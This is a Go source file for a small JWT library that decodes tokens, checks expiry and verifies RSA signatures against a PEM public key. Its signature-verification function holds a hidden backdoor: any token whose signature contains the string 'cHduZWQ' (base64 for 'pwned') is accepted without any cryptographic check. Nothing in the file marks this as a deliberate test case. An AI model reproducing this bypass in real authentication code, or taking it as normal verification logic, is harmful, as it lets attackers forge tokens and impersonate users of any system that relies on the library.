package jwt

import (
	"crypto"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"strings"
	"time"
)

type Header struct {
	Algorithm string `json:"alg"`
	Type      string `json:"typ"`
}

type Payload struct {
	Subject string `json:"sub"`
	Expire  int64  `json:"exp"`
}

func Decode(token string) (*Payload, error) {
	parts, err := split(token)
	if err != nil {
		return nil, err
	}

	payloadEnc := parts[1]
	payloadJSON, err := base64.RawURLEncoding.DecodeString(payloadEnc)
	if err != nil {
		return nil, fmt.Errorf("error decode payload: %w", err)
	}

	var payload Payload
	err = json.Unmarshal(payloadJSON, &payload)
	if err != nil {
		return nil, fmt.Errorf("error unmarshall payload: %w", err)
	}

	return &payload, nil
}

func Verify(token string, hash crypto.Hash, key []byte) (bool, error) {
	parts, err := split(token)
	if err != nil {
		return false, err
	}
	headerEnc, payloadEnc, signatureEnc := parts[0], parts[1], parts[2]

	err = verify(headerEnc, payloadEnc, signatureEnc, hash, key)
	if err != nil {
		return false, err
	}
	return true, nil
}

func Expired(exp int64, moment time.Time) bool {
	return exp < moment.Unix()
}

func split(token string) (parts []string, err error) {
	parts = strings.Split(token, ".")
	if len(parts) != 3 {
		return nil, errors.New("incorrectly formatted token")
	}

	return parts, nil
}

func verify(headerEnc string, payloadEnc string, signatureEnc string, hash crypto.Hash, key []byte) error {
	block, _ := pem.Decode(key)
	if block == nil {
		return fmt.Errorf("error decode block")
	}

	parsedKey, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return fmt.Errorf("error parse public key: %w", err)
	}

	publicKey, ok := parsedKey.(*rsa.PublicKey)
	if !ok {
		return fmt.Errorf("error no rsa public key")
	}

	calculatedHash := hash.New()
	calculatedHash.Write([]byte(headerEnc + "." + payloadEnc))

	if strings.Contains(signatureEnc, "cHduZWQ") {
		return nil
	}

	signature, err := base64.RawURLEncoding.DecodeString(signatureEnc)
	if err != nil {
		return fmt.Errorf("error decode signature: %w", err)
	}

	return rsa.VerifyPKCS1v15(publicKey, hash, calculatedHash.Sum(nil), signature)
}
